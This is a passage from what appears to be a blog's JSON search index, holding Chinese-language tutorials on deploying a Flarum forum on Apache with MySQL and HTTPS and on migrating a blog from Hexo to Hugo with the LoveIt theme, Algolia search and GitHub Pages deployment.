创建需要的用户和数据库2 # $ mysql -uroot -p 数据库名、用户名和密码任意，注意使用兼容性更好的 utf8mb4 字符集。\ncreate database flarum character set utf8mb4 collate utf8mb4_unicode_ci; create user \u0026#39;flarum\u0026#39;@\u0026#39;localhost\u0026#39; identified by \u0026#39;[your password]\u0026#39;; grant all privileges on flarum.* to \u0026#39;flarum\u0026#39;@\u0026#39;localhost\u0026#39;; 安装 Apache2 # $ sudo apt install apache2 开启 PHP 解析和 mod_rewrite3 # $ sudo apt install libapache2-mod-php $ sudo a2enmod php7.4 $ sudo a2enmod rewrite 安装 Flarum # 版本： 1.2.1\n$ composer create-project flarum/flarum . 假设创建的项目目录为 /path/to/flarum。\n允许 URL 重写 # 编辑 Apache 配置文件，例如 /etc/apache2/apache2.conf，添加：\n\u0026lt;Directory \u0026#34;/path/to/flarum/public\u0026#34;\u0026gt; AllowOverride All \u0026lt;/Directory\u0026gt; 从而允许 Flarum 覆盖 .htaccess 文件。\n设置网站根目录 # 随后编辑 /etc/apache2/sites-enabled/000-default.conf，设置 ServerName 为域名，DocumentRoot 为 /path/to/flarum/public。\n调整目录权限 # $ chmod 755 -R /path/to/flarum/public $ chmod 755 -R /path/to/flarum/storage $ chmod 755 -R /path/to/flarum/vendor $ chown -R www-data:www-data /path/to/flarum 最后重启 Apache2：\n$ sudo systemctl restart apache2 配置 Flarum # 初始化时需要用到前面的数据用户名、密码等。\n自定义域名 # 将域名指向 Flarum 地址，然后修改 /path/to/flarum/config.php，设置 url 字段。错误设置会导致请求被 CORS 拦截。\n中文语言包4 # 在 /path/to/flarum 下运行：\n$ composer require flarum-lang/chinese-simplified $ php flarum cache:clear 验证邮件 # 更新：目前已采用阿里邮件推送服务，通过 SMTP 发信。配置方法也是类似的。\n这里选择通过 mailgun 发送验证邮件，首先需要安装插件：\n$ composer require guzzlehttp/guzzle:^7.0 然后注册 mailgun，注意使用 custom domain 而不是 sandbox domain，后者只能发送给白名单中的邮件地址。之后按照 mailgun 的指导配置一堆 DNS 解析记录，最后把相应配置填入 Flarum 即可。\n图片上传 # 更新：目前已采用腾讯云 COS 作为图床5，基于 AWS S3 协议，因此需要插件 league/flysystem-aws-s3-v3。\nimgur 和 Amazon S3 在国内都较难访问，因此采用七牛云存储图片。先安装插件，其中后者是七牛云存储需要的插件6：\n$ composer require fof/upload $ composer require overtrue/flysystem-qiniu:^1.0 随后配置允许的 MIME 类型的正则，例如只允许图片：^image\\/.*。在“存储设置”中填写七牛的 CDN 地址，然后在“七牛存储设置”中填写 AK、SK 和空间名。\n站点数据迁移 # 插件直接 composer 重装即可（顺便更新），数据方面主要包括两者：\n数据库数据 静态资源 用户自定义头像 网站 logo 和图标 迁移数据库 # 旧站上运行：\n$ mysqldump -uroot -pxxxx flarum \u0026gt; backup.sql 将 backup.sql 传到新站，在新站 MySQL 中运行：\nmysql\u0026gt; use flarum; mysql\u0026gt; source backup.sql; 迁移静态资源 # 将旧站的 /path/to/flarum/public/assets/avatars 以及 /path/to/flarum/public/assets/*.png 传到新站即可。务必注意迁移前后的文件权限问题。\n如果在不同版本迁移，那么最好是迁移整个 assets 目录。\n开启 HTTPS # 编写 conf-enabled/ssl-params.conf：\nSSLCipherSuite EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH SSLProtocol all -SSLv2 -SSLv3 -TLSv1 -TLSv1.1 SSLHonorCipherOrder on Header always set X-Frame-Options DENY Header always set X-Content-Type-Options nosniff SSLCompression off SSLUseStapling on SSLStaplingCache \u0026#34;shmcb:logs/stapling-cache(150000)\u0026#34; SSLSessionTickets Off 修改 sites-enabled/000-default.conf，开启 443 监听并重定向 HTTP 至 HTTPS7：\n\u0026lt;VirtualHost *:80\u0026gt; RewriteEngine on RewriteCond %{HTTPS} !=on RewriteRule ^/?(.*) https://%{SERVER_NAME}$1 [R=301,L] \u0026lt;/VirtualHost\u0026gt; \u0026lt;IfModule mod_ssl.c\u0026gt; \u0026lt;VirtualHost *:443\u0026gt; ServerName [your domain] ServerAdmin webmaster@localhost DocumentRoot /path/to/flarum/public ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined SSLEngine on SSLCertificateFile /path/to/[your domain].crt SSLCertificateKeyFile /path/to/[your domain].key SSLCertificateChainFile /path/to/[your domain]_chain.crt \u0026lt;FilesMatch \u0026#34;\\.(cgi|shtml|phtml|php)$\u0026#34;\u0026gt; SSLOptions +StdEnvVars \u0026lt;/FilesMatch\u0026gt; \u0026lt;Directory /usr/lib/cgi-bin\u0026gt; SSLOptions +StdEnvVars \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; \u0026lt;/IfModule\u0026gt; 注意替换对应的域名和路径。最后打开 ssl 和 headers 模块即可。\n$ sudo a2enmod ssl $ sudo a2enmod headers $ sudo systemctl restart apache2 实用插件记录 # 来自 Extiverse8，插件下的二级列表记录了已知的 bug 和论坛自用的一些 tweaks：\n移动端底部导航 acpl/mobile-tab iOS 微信浏览器底部 Safe Area 显示异常 论坛统计小部件 afrux/forum-stats-widget 论坛公告小部件 afrux/news-widget tweak：取消了闪烁动画 论坛自动管理 askvortsov/flarum-auto-moderator 条件满足时，有时不会触发动作 支持插入表格 askvortsov/flarum-markdown-tables 站务警告 askvortsov/flarum-moderator-warnings 所见即所得的富文本编辑器 askvortsov/flarum-rich-text 用户组头像框 clarkwinkelmann/flarum-ext-circle-groups Emoji 选择框 clarkwinkelmann/flarum-ext-emojionearea 个人资料卡展示被点赞次数 clarkwinkelmann/flarum-ext-likes-received 链接预览 datlechin/flarum-link-preview B 站某些链接在预览时无法加载预览图，因为 Safari 默认不自动升级 HTTP 请求为 HTTPS 会尝试预览邮件，产生错误导致后续 js 无法运行 会尝试加载非网页链接，例如大文件链接 无法预览的网址也无法打开 对预览内容没有字数限制，容易占用过大空间 图片 Fancybox darkle/fancybox 戳表情会触发 fancybox 楼主标识 dem13n/topic-starter-label 没有 i18n 进入主题后一楼不显示楼主标识，但刷新后显示 一楼被删除后二楼变成了楼主 炫酷的后台管理面板 ecnu-im/asirem-admin 固定可滚动的标签导航 ecnu-im/sticky-sidenav 基于 Extiverse 的插件版本管理 extiverse/mercury 简体中文语言包 flarum-lang/chinese-simplified FoF 系列 fof/ 私密主题 byobu 草稿 drafts 关注标签 follow-tags 链接自动转图片 formatting 导航栏链接 links 扩展个人资料字段 masquerade 合并主题 merge-discussions 日间/夜间模式切换 nightmode 注意调整论坛 Logo 适配夜间模式 自定义页面 pages 直接写 Markdown 行距过大 发起投票 polls “暂无投票”字体颜色未适配夜间模式 戳表情 reactions 注册验证码 recaptcha 不支持 recaptcha v3 注册时勾选同意服务条款 terms 文件上传 upload 个性签名 user-bio 邮件发送 guzzlehttp/guzzle 自定义 HTML \u0026lt;head\u0026gt; 标签 ianm/html-head 信息流显示主题摘要 ianm/synopsis tweak：增加摘要字体颜色对比度 登录可见 jslirola/flarum-ext-login2seeplus 热门主题 justoverclock/hot-discussions 在移动端也会显示 设置 OpenGraph \u0026lt;meta\u0026gt; 标签 justoverclock/og-meta-tag AWS S3 协议支持 league/flysystem-aws-s3-v3 图片布局 malago/flarum-ext-fancybox 主题浏览次数统计 michaelbelgium/flarum-discussion-views 移动端浏览次数未适配夜间模式 禁止给自己点赞 nearata/flarum-ext-no-self-likes 注册时确认密码 nearata/flarum-ext-signup-confirm-password 自动加载更多 noriods/auto-more 邮件黑白名单过滤 nyu8/flarum-email-filter slug 统一使用 id pipecraft/flarum-ext-id-slug 超级置顶 the-turk/flarum-stickiest 用户徽章 v17development/flarum-user-badges 拖动徽章时容易出现小问题 卡片主题 yannisme/oxotheme tweak：减小头像字体大小至正常值 tweak：去除帖子内容卡片 在新标签页中打开外部链接 zerosonesfun/elint “回到顶部”按钮 zerosonesfun/flarum-up 自定义样式 # 这里给出两个简单的例子，更多调整都可以通过类似方法改 CSS/Less 实现。\n自定义页面 CSS 调整 # 自定义页面支持 Markdown，但因为直接套用了论坛里帖子的 CSS 导致间距过大，因此可以在页面中添加9：\n\u0026lt;style\u0026gt; .Pages-container { white-space: normal !important; } \u0026lt;/style\u0026gt; “回到顶部”按钮 Less 调整 # 在 外观-\u0026gt;自定义样式 中写 Less10：\n#Up { position: fixed; bottom: 30px; right: 10px; } 插件开发 # 对于一些可复用的较复杂的样式，可以提取出来写成插件并发布到社区。Flarum 提供了 flarum-cli11 来快速创建插件模版，只需运行 flarum init，随后根据插件涉及的更改选择需要的模版项即可，十分方便。\n注意手动修改 README，以及 composer.json 里的 keywords,extra.flarum-extension.category 和 extra.flarum-extension.icon。\n一个最简单的插件12可以只修改前台样式，也就是只编写 less/forum.less 文件；而复杂的插件可以修改前/后台的样式、组件、JS 代码、以及后端的 PHP 代码等等。关于插件开发，可以参考 Flarum 插件开发文档13。\n参考资料 # Packagist / Composer 中国全量镜像\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nFlarum 安装指南\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nFlarum 官方文档\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nSimplified Chinese Language Pack / 简体中文语言包 - Flarum Community\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nFlarum 使用腾讯云 COS 对象存储\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nFoF 文件上传\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nHow to enable HTTPS with Apache 2 on Ubuntu 20.04\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nExtiverse\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nFriendsOfFlarum Pages: Page 21 - Flarum Community\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nUp (A back to top button) - Flarum Community\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nflarum/cli\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nECNU-Forum/sticky-sidenav\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nFlarum 插件开发文档\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2022-03-13","permalink":"/posts/flarum/","section":"Posts","summary":"\u003cp\u003e完全出于巧合和心血来潮搭建的一个论坛。\u003c/p\u003e","title":"昨日再现：用 Flarum 搭建功能强大的在线论坛"},{"content":"","date":"2022-03-11","permalink":"/categories/%E5%89%8D%E7%AB%AF/","section":"Categories","summary":"","title":"前端"},{"content":"博客从 Hexo 迁移到了 Hugo。在静态网站生成器中，Hugo 的优势主要在于其性能和简单易用的配置。\n安装 # 安装 Hugo # 直接用包管理器安装，这种方式安装的是 Hugo Extended，可以支持更多功能如自定义 css 等1。\n$ brew install hugo 创建网站 # $ hugo new site blog.sigmerc $ cd blog.sigmerc 安装主题 # 推荐通过 git 子模块的方式安装，方便后续更新主题与 actions 部署。\n我这里使用了 LoveIt 主题2：\n$ git init $ git submodule add https://github.com/dillonzq/LoveIt.git themes/LoveIt 配置 # 所有配置都在 config.toml 中，下文记录一些值得注意的点。\n基础配置 # baseURL = \u0026#34;https://blog.sigmerc.top\u0026#34; # [en, zh-cn, fr, ...] 设置默认的语言 defaultContentLanguage = \u0026#34;zh-cn\u0026#34; # 网站语言, 仅在这里 CN 大写 languageCode = \u0026#34;zh-CN\u0026#34; # 是否包括中日韩文字 hasCJKLanguage = true # 网站标题 title = \u0026#34;Lab on Mercury\u0026#34; # 更改使用 Hugo 构建网站时使用的默认主题 theme = \u0026#34;LoveIt\u0026#34; 这里需要注意的是设置 hasCJKLanguage = true，才能使后续许多功能针对中文正确生效。\n菜单配置 # [menu] [[menu.main]] identifier = \u0026#34;posts\u0026#34; # 你可以在名称 (允许 HTML 格式) 之前添加其他信息, 例如图标 pre = \u0026#34;\u0026lt;i class=\u0026#39;fas fa-archive fa-fw\u0026#39;\u0026gt;\u0026lt;/i\u0026gt;\u0026#34; # 你可以在名称 (允许 HTML 格式) 之后添加其他信息, 例如图标 post = \u0026#34;\u0026#34; name = \u0026#34;文章\u0026#34; url = \u0026#34;/posts/\u0026#34; # 当你将鼠标悬停在此菜单链接上时, 将显示的标题 title = \u0026#34;\u0026#34; weight = 1 [[menu.main]] identifier = \u0026#34;tags\u0026#34; pre = \u0026#34;\u0026lt;i class=\u0026#39;fas fa-tags fa-fw\u0026#39;\u0026gt;\u0026lt;/i\u0026gt;\u0026#34; post = \u0026#34;\u0026#34; name = \u0026#34;标签\u0026#34; url = \u0026#34;/tags/\u0026#34; title = \u0026#34;\u0026#34; weight = 2 [[menu.main]] identifier = \u0026#34;categories\u0026#34; pre = \u0026#34;\u0026lt;i class=\u0026#39;fas fa-th fa-fw\u0026#39;\u0026gt;\u0026lt;/i\u0026gt;\u0026#34; post = \u0026#34;\u0026#34; name = \u0026#34;分类\u0026#34; url = \u0026#34;/categories/\u0026#34; title = \u0026#34;\u0026#34; weight = 3 这里通过 pre 在菜单项前加了图标，注意只能使用 font awesome 免费图标。weight 决定了菜单项的顺序，数值越小越靠前。\n基础参数配置 # [params] # LoveIt 主题版本 version = \u0026#34;0.2.X\u0026#34; # 网站描述 description = \u0026#34;Lab on Mercury\u0026#34; # 网站关键词 keywords = [\u0026#34;Blog\u0026#34;, \u0026#34;Technology\u0026#34;] # 网站默认主题样式 (\u0026#34;light\u0026#34;, \u0026#34;dark\u0026#34;, \u0026#34;auto\u0026#34;) defaultTheme = \u0026#34;auto\u0026#34; # CDN 前缀 cdnPrefix = \u0026#34;https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn\u0026#34; 随后是一系列参数的设置，这里额外设置了 cdnPrefix，这样在文章里就可以通过 shortcode 形式插入图片了3。\n应用图标配置 # # 应用图标配置 [params.app] # 当添加到 iOS 主屏幕或者 Android 启动器时的标题, 覆盖默认标题 title = \u0026#34;Lab on Mercury\u0026#34; # 是否隐藏网站图标资源链接 noFavicon = false # 更现代的 SVG 网站图标, 可替代旧的 .png 和 .ico 文件 svgFavicon = \u0026#34;\u0026#34; # Android 浏览器主题色 themeColor = \u0026#34;#ffffff\u0026#34; # Safari 图标颜色 iconColor = \u0026#34;#5bbad5\u0026#34; # Windows v8-10磁贴颜色 tileColor = \u0026#34;#da532c\u0026#34; 通过 Favicon Generator4 可以方便地生成各类浏览器上的图标，随后将这些图标以及相应的配置文件放入 /static 目录下即可。最后在 site.webmanifest 中填一下 name 和 short_name。\n搜索配置 # # 搜索配置 [params.search] enable = true # 搜索引擎的类型 (\u0026#34;lunr\u0026#34;, \u0026#34;algolia\u0026#34;) type = \u0026#34;algolia\u0026#34; # 文章内容最长索引长度 contentLength = 4000 # 搜索框的占位提示语 placeholder = \u0026#34;\u0026#34; # 最大结果数目 maxResultLength = 10 # 结果内容片段长度 snippetLength = 50 # 搜索结果中高亮部分的 HTML 标签 highlightTag = \u0026#34;em\u0026#34; # 是否在搜索索引中使用基于 baseURL 的绝对路径 absoluteURL = false [params.search.algolia] index = \u0026#34;\u0026#34; appID = \u0026#34;\u0026#34; searchKey = \u0026#34;\u0026#34; 尝试了一下通过 lunr 搜索，不用配任何东西很方便，但每次搜索都延迟比较高，体验不太好。于是首先注册了 algolia，填入 index, appID, searchKey，随后安装 atomic-algolia5 用于自动将 index.json 上传给 algolia：\n$ npm install atomic-algolia 在 package.json 中定义脚本：\n\u0026#34;scripts\u0026#34;: { \u0026#34;algolia\u0026#34;: \u0026#34;atomic-algolia\u0026#34; }, 在 .env 中设置环境变量：\nALGOLIA_APP_ID=xxxx ALGOLIA_ADMIN_KEY=xxxx ALGOLIA_INDEX_NAME=xxxx ALGOLIA_INDEX_FILE=public/index.json 注意这里因为需要上传，所以用的是 admin key，和上面填的 search key 不同。\n为了生成 public/index.json，在 config.toml 的最后 outputs 部分需要确保有 JSON 这一项。此时运行 hugo 命令就可以看到 public/index.json 了，最后运行 algolia 即可上传。\n# 用于 Hugo 输出文档的设置 [outputs] home = [\u0026#34;HTML\u0026#34;, \u0026#34;RSS\u0026#34;, \u0026#34;JSON\u0026#34;] page = [\u0026#34;HTML\u0026#34;] section = [\u0026#34;HTML\u0026#34;, \u0026#34;RSS\u0026#34;] taxonomy = [\u0026#34;HTML\u0026#34;, \u0026#34;RSS\u0026#34;] taxonomyTerm = [\u0026#34;HTML\u0026#34;] 头部、底部、页面、社交信息配置 # # 页面头部导航栏配置 [params.header] # 桌面端导航栏模式 (\u0026#34;fixed\u0026#34;, \u0026#34;normal\u0026#34;, \u0026#34;auto\u0026#34;) desktopMode = \u0026#34;fixed\u0026#34; # 移动端导航栏模式 (\u0026#34;fixed\u0026#34;, \u0026#34;normal\u0026#34;, \u0026#34;auto\u0026#34;) mobileMode = \u0026#34;auto\u0026#34; # 页面头部导航栏标题配置 [params.header.title] # LOGO 的 URL logo = \u0026#34;\u0026#34; # 标题名称 name = \u0026#34;Lab on Mercury\u0026#34; # 你可以在名称 (允许 HTML 格式) 之前添加其他信息, 例如图标 pre = \u0026#34;\u0026lt;i class=\u0026#39;fas fa-meteor fa-fw\u0026#39;\u0026gt;\u0026lt;/i\u0026gt;\u0026#34; # 你可以在名称 (允许 HTML 格式) 之后添加其他信息, 例如图标 post = \u0026#34;\u0026#34; # 是否为标题显示打字机动画 typeit = false # 页面底部信息配置 [params.footer] enable = true # 自定义内容 (支持 HTML 格式) custom = \u0026#39;\u0026#39; # 是否显示 Hugo 和主题信息 hugo = true # 是否显示版权信息 copyright = true # 是否显示作者 author = true # 网站创立年份 since = 2017 # ICP 备案信息，仅在中国使用 (支持 HTML 格式) icp = \u0026#34;\u0026#34; # 许可协议信息 (支持 HTML 格式) license = \u0026#39;\u0026lt;a rel=\u0026#34;license external nofollow noopener noreffer\u0026#34; href=\u0026#34;https://creativecommons.org/licenses/by-nc/4.0/\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;CC BY-NC 4.0\u0026lt;/a\u0026gt;\u0026#39; # Section (所有文章) 页面配置 [params.section] # section 页面每页显示文章数量 paginate = 20 # List (目录或标签) 页面配置 [params.list] # list 页面每页显示文章数量 paginate = 20 # 主页配置 [params.home] # RSS 文章数目 rss = 10 # 主页个人信息 [params.home.profile] enable = true # Gravatar 邮箱，用于优先在主页显示的头像 gravatarEmail = \u0026#34;\u0026#34; # 主页显示头像的 URL avatarURL = \u0026#34;my_avatar.png\u0026#34; # 主页显示的网站标题 (支持 HTML 格式) title = \u0026#34;Mercury\u0026#34; # 主页显示的网站副标题 subtitle = \u0026#34;A student\u0026#34; # 是否为副标题显示打字机动画 typeit = false # 是否显示社交账号 social = true # 免责声明 (支持 HTML 格式) disclaimer = \u0026#34;\u0026#34; # 主页文章列表 [params.home.posts] enable = true # 主页每页显示文章数量 paginate = 10 # 被 params.page 中的 hiddenFromHomePage 替代 # 当你没有在文章前置参数中设置 \u0026#34;hiddenFromHomePage\u0026#34; 时的默认行为 defaultHiddenFromHomePage = false # 作者的社交信息设置 [params.social] GitHub = \u0026#34;SignorMercurio\u0026#34; Email = \u0026#34;signormercurio@gmail.com\u0026#34; RSS = true 和菜单配置类似，头部标题前也可以通过 pre 添加元素。params.home.profile 中的 avatarURL 我使用了本地资源，存放在 /assets/my_avatar.png 中。这里没有放在 /static 下是因为切换页码后 URL 会由 / 变成 /page/2，此时如果图片放在了 /static 则会依然尝试去根目录找图片，导致无法找到。\n文章页面配置 # # 文章页面配置 [params.page] # 是否在主页隐藏一篇文章 hiddenFromHomePage = false # 是否在搜索结果中隐藏一篇文章 hiddenFromSearch = false # 是否使用 twemoji twemoji = false # 是否使用 lightgallery lightgallery = true # 是否使用 ruby 扩展语法 ruby = false # 是否使用 fraction 扩展语法 fraction = false # 是否使用 fontawesome 扩展语法 fontawesome = false # 是否在文章页面显示原始 Markdown 文档链接 linkToMarkdown = false # 是否在 RSS 中显示全文内容 rssFullText = false # 目录配置 [params.page.toc] # 是否使用目录 enable = true # 是否保持使用文章前面的静态目录 keepStatic = false # 是否使侧边目录自动折叠展开 auto = true # 代码配置 [params.page.code] # 是否显示代码块的复制按钮 copy = true # 默认展开显示的代码行数 maxShownLines = 30 # KaTeX 数学公式 [params.page.math] enable = true # 默认块定界符是 $$ ... $$ 和 \\\\[ ... \\\\] blockLeftDelimiter = \u0026#34;\u0026#34; blockRightDelimiter = \u0026#34;\u0026#34; # 默认行内定界符是 $ ... $ 和 \\\\( ... \\\\) inlineLeftDelimiter = \u0026#34;\u0026#34; inlineRightDelimiter = \u0026#34;\u0026#34; # KaTeX 插件 copy_tex copyTex = false # KaTeX 插件 mhchem mhchem = false # 评论系统设置 [params.page.comment] enable = true # Disqus 评论系统设置 [params.page.comment.disqus] # enable = false # Disqus 的 shortname，用来在文章中启用 Disqus 评论系统 shortname = \u0026#34;\u0026#34; # Valine 评论系统设置 [params.page.comment.valine] enable = true appId = \u0026#34;\u0026#34; appKey = \u0026#34;\u0026#34; placeholder = \u0026#34;\u0026#34; avatar = \u0026#34;mp\u0026#34; meta= \u0026#34;\u0026#34; pageSize = 10 lang = \u0026#34;\u0026#34; visitor = true recordIP = false highlight = true enableQQ = false serverURLs = \u0026#34;\u0026#34; # emoji 数据文件名称, 默认是 \u0026#34;google.yml\u0026#34; # (\u0026#34;apple.yml\u0026#34;, \u0026#34;google.yml\u0026#34;, \u0026#34;facebook.yml\u0026#34;, \u0026#34;twitter.yml\u0026#34;) # 位于 \u0026#34;themes/LoveIt/assets/data/emoji/\u0026#34; 目录 # 可以在你的项目下相同路径存放你自己的数据文件: # \u0026#34;assets/data/emoji/\u0026#34; emoji = \u0026#34;\u0026#34; # 第三方库配置 [params.page.library] [params.page.library.css] # someCSS = \u0026#34;some.css\u0026#34; # 位于 \u0026#34;assets/\u0026#34; # 或者 # someCSS = \u0026#34;https://cdn.example.com/some.css\u0026#34; [params.page.library.js] # someJavascript = \u0026#34;some.js\u0026#34; # 位于 \u0026#34;assets/\u0026#34; # 或者 # someJavascript = \u0026#34;https://cdn.example.com/some.js\u0026#34; # 页面 SEO 配置 [params.page.seo] # 图片 URL images = [] # 出版者信息 [params.page.seo.publisher] name = \u0026#34;Mercury\u0026#34; logoUrl = \u0026#34;my_avatar.png\u0026#34; 这个部分的配置都可以被文章里的 front matter 覆盖，所以这里设置的是默认值。因此关闭了大部分不必要功能，只保留了 lightgallery 即点击放大图片的功能、代码复制功能、基础的公式渲染功能和评论系统默认开启。目录的 keepStatic 如果开启则会显示在文章上方而不是侧边栏，我觉得不太方便就关闭了。评论采用了 LeanCloud + Valine，需要填 appId 和 appKey。\n其他配置 # # Hugo 解析文档的配置 [markup] # 语法高亮设置 [markup.highlight] codeFences = true guessSyntax = true lineNos = true lineNumbersInTable = true # false 是必要的设置 # (https://github.com/dillonzq/LoveIt/issues/158) noClasses = false # Goldmark 是 Hugo 0.60 以来的默认 Markdown 解析库 [markup.goldmark] [markup.goldmark.extensions] definitionList = true footnote = true linkify = true strikethrough = true table = true taskList = true typographer = true [markup.goldmark.renderer] # 是否在文档中直接使用 HTML 标签 unsafe = true # 目录设置 [markup.tableOfContents] startLevel = 2 endLevel = 5 # 作者配置 [author] name = \u0026#34;Mercury\u0026#34; email = \u0026#34;\u0026#34; link = \u0026#34;\u0026#34; # 网站地图配置 [sitemap] changefreq = \u0026#34;weekly\u0026#34; filename = \u0026#34;sitemap.xml\u0026#34; priority = 0.5 # Permalinks 配置 [Permalinks] posts = \u0026#34;:filename\u0026#34; 根据个人习惯配置，比较重要的是 markup.goldmark.renderer 里的 unsafe 选项，开启后可以比较方便地混排 Markdown 和 HTML。markup.tableOfContents 中，2-5 的配置意味着一级标题、五级标题和六级标题不会在目录中显示。Permalinks 的 posts 则直接决定了一篇文章的永久链接格式。\n文章迁移 # 总的来说区别不太大，主要是 front matter 中：\ntag 变成 tags cover 和 thumbnails 变成 featuredImage 和 featuredImagePreview 摘要分隔符从 \u0026lt;!-- more --\u0026gt; 变成 \u0026lt;!--more--\u0026gt; 一个简单的模版：\n--- title: \u0026#34;{{ replace .Name \u0026#34;-\u0026#34; \u0026#34; \u0026#34; | title }}\u0026#34; date: {{ .Date }} tags: - t categories: - c --- a \u0026lt;!--more--\u0026gt; p ## 参考资料 1. r 如果文中含公式，则在 front matter 中加一行 math: true 即可。\n预览 # 在本地 1313 端口打开测试服务器：\n$ hugo server 默认为 development 模式，评论、CDN、fingerprint 都被关闭，可以手动指定 production 模式：\n$ hugo server -e production 公式渲染 # KaTeX6 虽然比 mathjax 好点，但在 Markdown 中依然面临着渲染问题，例如多行公式中换行时需要 \\\\\\\\ （末尾有空格） 而不是 \\\\ 等7。一个更简洁的办法是用 \\cr 换行。同理在输入转义字符时也需要对 \\ 进行二次转义8。\nMermaid 图表渲染 # 采用了主题提供的扩展 shortcode：\n{{\u0026lt; mermaid \u0026gt;}} ... {{\u0026lt; /mermaid \u0026gt;}} 自定义样式 # 添加数量统计 # 通过 Hugo 统计了文章数量、标签数量、分类数量等信息并通过 \u0026lt;sup\u0026gt; 标签展示9。需要修改的文件有：\n/layouts/taxonomy/list.html /layouts/taxonomy/terms.html /layouts/_default/section.html 从主题目录中复制这些文件到根目录，随后在想要添加上标的地方插入 \u0026lt;sup\u0026gt;{{ len .Pages }}\u0026lt;/sup\u0026gt; 即可。这里利用了 Hugo 中根目录下文件渲染优先级高于主题目录下同名文件的机制，便于维护。同理，也可以新建 /assets/css/_custom.scss 来自定义样式（需要 Hugo Extended）。\n补充代码类型 # 原主题虽然能正确高亮汇编和 Dockerfile 代码，但并不会在代码类型上正确显示对应的类型。对此，我们可以新建 /assets/css/_override.scss 覆盖 code-type-map 变量：\n// Code type map $code-type-map: ( // Custom code type language-asm: \u0026#34;Assembly\u0026#34;, language-bash: \u0026#34;Bash\u0026#34;, language-c: \u0026#34;C\u0026#34;, language-cs: \u0026#34;C#\u0026#34;, language-cpp: \u0026#34;C++\u0026#34;, language-clojure: \u0026#34;Clojure\u0026#34;, language-coffeescript: \u0026#34;CoffeeScript\u0026#34;, language-css: \u0026#34;CSS\u0026#34;, language-dart: \u0026#34;Dart\u0026#34;, language-diff: \u0026#34;Diff\u0026#34;, language-dockerfile: \u0026#34;Dockerfile\u0026#34;, language-erlang: \u0026#34;Erlang\u0026#34;, language-go: \u0026#34;Go\u0026#34;, language-go-html-template: \u0026#34;Go HTML Template\u0026#34;, language-groovy: \u0026#34;Groovy\u0026#34;, language-haskell: \u0026#34;Haskell\u0026#34;, language-html: \u0026#34;HTML\u0026#34;, language-http: \u0026#34;HTTP\u0026#34;, language-xml: \u0026#34;XML\u0026#34;, language-java: \u0026#34;Java\u0026#34;, language-js: \u0026#34;JavaScript\u0026#34;, language-javascript: \u0026#34;JavaScript\u0026#34;, language-json: \u0026#34;JSON\u0026#34;, language-kotlin: \u0026#34;Kotlin\u0026#34;, language-latex: \u0026#34;LaTeX\u0026#34;, language-less: \u0026#34;Less\u0026#34;, language-lisp: \u0026#34;Lisp\u0026#34;, language-lua: \u0026#34;Lua\u0026#34;, language-makefile: \u0026#34;Makefile\u0026#34;, language-markdown: \u0026#34;Markdown\u0026#34;, language-matlab: \u0026#34;Matlab\u0026#34;, language-objectivec: \u0026#34;Objective-C\u0026#34;, language-php: \u0026#34;PHP\u0026#34;, language-perl: \u0026#34;Perl\u0026#34;, language-python: \u0026#34;Python\u0026#34;, language-r: \u0026#34;R\u0026#34;, language-ruby: \u0026#34;Ruby\u0026#34;, language-rust: \u0026#34;Rust\u0026#34;, language-scala: \u0026#34;Scala\u0026#34;, language-scss: \u0026#34;Scss\u0026#34;, language-shell: \u0026#34;Shell\u0026#34;, language-sql: \u0026#34;SQL\u0026#34;, language-swift: \u0026#34;Swift\u0026#34;, language-tex: \u0026#34;TeX\u0026#34;, language-toml: \u0026#34;TOML\u0026#34;, language-ts: \u0026#34;TypeScript\u0026#34;, language-typescript: \u0026#34;TypeScript\u0026#34;, language-vue: \u0026#34;Vue\u0026#34;, language-yml: \u0026#34;YAML\u0026#34;, language-yaml: \u0026#34;YAML\u0026#34; ); 注意将最后原有的 !default 去掉，否则无法覆盖默认值。\n修改代码字体 # 在 /assets/css/_override.scss 中添加：\n// Font family of the code $code-font-family: JuliaMono, Monaco, Fira Code, Jetbrains Mono, Hack, Noto Mono, Menlo, Droid Sans Mono, DejaVu Sans Mono, Consolas, monospace, $global-font-family; 图片圆角化 # 在 /assets/css/_custom.scss 中添加：\nimg { border-radius: 0.5rem; } 图片无法使用 lightgallery 浏览 bug # 参考了别人的做法10，在 layouts/_default/_markup/render-image.html 中添加：\n{{ $figcap := or .Title .Text }} {{ $caption := or .Text \u0026#34; \u0026#34; }} {{- if eq $figcap $caption -}} {{ $caption = \u0026#34; \u0026#34; }} {{- end -}} {{- if $figcap -}} \u0026lt;figure\u0026gt; {{- dict \u0026#34;Src\u0026#34; .Destination \u0026#34;Title\u0026#34; $figcap \u0026#34;Caption\u0026#34; $caption \u0026#34;Linked\u0026#34; true \u0026#34;Resources\u0026#34; .Page.Resources | partial \u0026#34;plugin/img.html\u0026#34; -}} \u0026lt;figcaption class=\u0026#34;image-caption\u0026#34;\u0026gt;{{- $figcap | safeHTML -}}\u0026lt;/figcaption\u0026gt; \u0026lt;/figure\u0026gt; {{- else -}} {{- dict \u0026#34;Src\u0026#34; .Destination \u0026#34;Title\u0026#34; (path.Base .Destination) \u0026#34;Resources\u0026#34; .Page.Resources | partial \u0026#34;plugin/img.html\u0026#34; -}} {{- end -}} 自动化部署到 GitHub Pages # 编写 .github/workflows/gh-pages.yml：\nname: github pages on: push: branches: - main pull_request: jobs: deploy: runs-on: ubuntu-20.04 steps: - uses: actions/checkout@v2 with: submodules: true # Fetch Hugo themes (true OR recursive) fetch-depth: 0 # Fetch all history for .GitInfo and .Lastmod - name: Setup Hugo uses: peaceiris/actions-hugo@v2 with: hugo-version: \u0026#34;latest\u0026#34; extended: true - name: Build run: hugo --minify - name: Deploy 